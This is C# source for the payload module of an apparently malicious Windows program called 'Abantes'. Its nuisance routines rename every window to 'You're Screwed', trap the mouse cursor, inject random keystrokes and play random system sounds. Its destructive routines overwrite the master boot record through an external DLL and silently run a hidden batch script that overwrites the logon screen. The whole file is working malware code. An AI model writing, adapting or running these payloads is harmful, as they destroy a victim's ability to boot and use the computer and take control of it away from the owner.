using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;
using Abantes.Utils;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Speech.Synthesis;
using System.Media;
using Microsoft.Win32;

namespace Abantes.Payloads
{

    class Threads
    {

    }
    class Anoying
    {
        [DllImport("user32.dll")]
        static extern int SetWindowText(IntPtr hWnd, string text);
        public static void ChangeWindowText()
        {
            Process[] allProcesses = Process.GetProcesses();
            for (int i = 0; i < allProcesses.Length; i++)
            {
                SetWindowText(allProcesses[i].MainWindowHandle, "You're Screwed");
            }
        }
        static Point Position;
        static Random _random = new Random();
        public static void MouseTrap()
        {

            Position.X = 0;
            Position.Y = 0;
            while (true)
            {
                Cursor.Position = Position;
            }
        }
        public static void RandomKeyboard()
        {

            while (true)
            {
                if (_random.Next(100) > 95)
                {
                    char key = (char)(_random.Next(25) + 65);
                    if (_random.Next(2) == 0)
                    {
                        key = Char.ToLower(key);
                    }
                    SendKeys.SendWait(key.ToString());
                }
                Thread.Sleep(400);
            }
        }
        public static void RandomOSSounds()
        {
            while (true)
            {
                if (_random.Next(100) > 80)
                {
                    switch (_random.Next(5))
                    {
                        case 0:
                            SystemSounds.Asterisk.Play();
                            break;
                        case 1:
                            SystemSounds.Beep.Play();
                            break;
                        case 2:
                            SystemSounds.Exclamation.Play();
                            break;
                        case 3:
                            SystemSounds.Hand.Play();
                            break;
                        case 4:
                            SystemSounds.Question.Play();
                            break;
                    }
                }
                Thread.Sleep(400);
            }
        }
    }
    class Destructive
    {
        [DllImport("Payloads.dll", CharSet = CharSet.Unicode, EntryPoint = "?MBR_Overwrite@Payloads@1@QAEXXZ")]
        public static extern void MBR_Overwrite();
        public static void MBROverwrite()
        {
            MBR_Overwrite();
        }
        public static void LogonUIOverwrite()
        {
            string TempPath = Path.GetTempPath();
            Process ScriptProcess = new Process();
            ScriptProcess.StartInfo.CreateNoWindow = true;
            ScriptProcess.StartInfo.FileName = TempPath + "\\logonOverwrite.bat"; 
            ScriptProcess.Start();
        }
    }
    class WatchDogThreads
    {

    }
}
